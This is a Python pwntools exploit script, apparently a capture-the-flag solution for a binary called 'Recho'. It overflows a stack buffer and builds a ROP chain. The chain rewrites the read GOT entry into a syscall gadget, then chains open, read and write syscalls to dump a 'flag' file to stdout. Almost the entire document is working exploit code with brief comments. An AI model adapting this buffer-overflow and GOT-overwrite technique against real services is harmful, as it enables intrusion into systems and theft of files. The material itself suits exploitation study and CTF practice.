from pwn import *

#context.log_level = 'debug'

e = ELF("./Recho")
p = process("./Recho")

address_add = 0x40070d #add byte [rdi], al ; ret
pop_rax = 0x004006fc # pop rax ; ret  ;
pop_rdi = 0x004008a3
pop_rsi = 0x004008a1 # pop rsi ; pop r15 ; ret
pop_rdx = 0x004006fe # pop rdx ; ret

read_addr = e.got['read']	# 0x601030
syscall = 0x400600 # read@plt

flag_address = 0x00601058

# 1. read_addr.got -> add byte! result= syscall_address
payload =  "A"*48	# buffer
payload += p64(e.bss()) # sfp
payload += p64(pop_rax)
payload += p64(0xe)		# read_addr+0xe = syscall_address
payload += p64(pop_rdi)
payload += p64(read_addr)
payload += p64(address_add) # read_addr.got -> syscall_adress

# 2. syscall open(flag, 0, 0) O_RDONLY=0 #http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
payload += p64(pop_rax)
payload += p64(0x2)		# open syscall_num , open func is return fd number
payload += p64(pop_rdi)
payload += p64(flag_address) # "flag"
payload += p64(pop_rsi)
payload += p64(0)*2		# O_RDONLY=0
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)
#fd: 0, 1, 2 is stdin, stdout, stderr // and next open call return is 3, because it gives the smallest value that is not currently used.

# 3. read flag! syscall read to bss
payload += p64(pop_rax)
payload += p64(0x0)		# read syscall_num
payload += p64(pop_rdi)
payload += p64(0x3) # open flag fd number
payload += p64(pop_rsi)
payload += p64(e.bss())+p64(0)	# bss
payload += p64(pop_rdx)
payload += p64(100)	# read size
payload += p64(syscall)

# 4. syscall write! write stdout
payload += p64(pop_rax)
payload += p64(0x1)		# wrtie syscall_num
payload += p64(pop_rdi)
payload += p64(0x1) # stdout
payload += p64(pop_rsi)
payload += p64(e.bss())+p64(0)	# bss
payload += p64(pop_rdx)
payload += p64(100)	# write size
payload += p64(syscall)

p.sendlineafter("Welcome to Recho server!",str(len(payload)))
sleep(2)
p.sendline(payload)

p.shutdown()

cut=42

recv = p.recvall()
recv = recv[cut:recv.find('\00')]

print(recv)
p.close()